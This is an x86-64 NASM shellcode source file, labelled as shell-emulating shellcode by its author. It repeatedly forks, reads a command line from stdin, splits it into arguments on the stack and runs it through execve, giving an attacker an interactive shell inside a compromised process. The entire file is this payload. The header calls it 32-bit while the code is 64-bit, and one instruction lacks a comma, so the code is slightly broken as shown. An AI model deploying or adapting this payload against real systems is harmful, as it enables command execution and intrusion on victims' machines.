;;;  Evan Jensen 32bit shell emulating shellcode
;;; 
;;;  RDI, RSI, RDX, RCX, R8, and R9 then stack
	
	%include "short64.s"
	%include "syscall.s"
	%define BUFFERLEN 0x1f8

	global main

main:

	do_fork:
	xor eax, eax
	mov al fork
	syscall
	test eax,eax
	jz child
parent:
	xor edi,edi		;pid
	xor esi,esi		;status
	xor edx,edx		;options
	xor ecx,ecx		;struct rusage*=NULL
	lea eax,[rdi+wait4]
	syscall			;wait(0,0,0,0);
	jmp main

child:	
	cld
get_input:
	xor eax,eax
	lea edx,[rax+BUFFERLEN] ;size of read
	mov r8d, edx		;save readsize
	sub rsp,rdx		;make some room on the stack
	mov rsi,rsp		;use new stack space as buffer for read
	xor edi,edi		;fd
	mov al,read	
	syscall			;read into stack buffer
	
	mov ebp,eax		;save len of str_read
	test eax,eax		;we must read more than 0 bytes
	jz do_exit 		;synchronous IO or GTFO
	xor edx, edx
	lea rcx, [rax+rsp]
	mov byte [rcx-1],dl	;replace newline with nullbyte
	
	;; let's parse the arguments here
	mov ecx,eax		;return of read pushed by get_input
	lea eax, [rdx+0x20]	;" " (space) is the delimiter
	mov rbx,rsp		;rbx is the buffer
	xor edx,edx
	add rsp,r8		;rsp is now going to be argv
add_token: 	;; calculate the pointer to push
	
	mov rsi,rbp		;number of chars in buffer
	sub rsi,rcx		;subtract number of chars left in buffer
				;rcx is modified by the repne scasb instruction
 	
	lea rdi,[rbx + rsi]  	;rdi points to current token
	mov [rsp+rdx*8], rdi 	;save the current token pointer building argv
	add edx, 1		;increment index into argv
scan_loop:	
	repne scasb
	
	mov rsi,rbp
	sub rsi,rcx
	xor eax, eax
	mov byte[rbx+rsi-1],al	;null terminate each token (strtok)
	mov al, 0x20 		; delimiter
	test rcx,rcx
	jnz short add_token
	
exec:
	xor eax,eax
	mov [rsp+rdx*8],rax
	mov al,execve
	mov rdi,rbx
	mov rsi,rsp
	xor edx, edx		; rdx=null
	syscall		;execve(cmd,args,environ=NULL);
	
do_exit:;; exit nicely if anything fails
	xor edi,edi
	lea eax,[rdi+exit]
	syscall
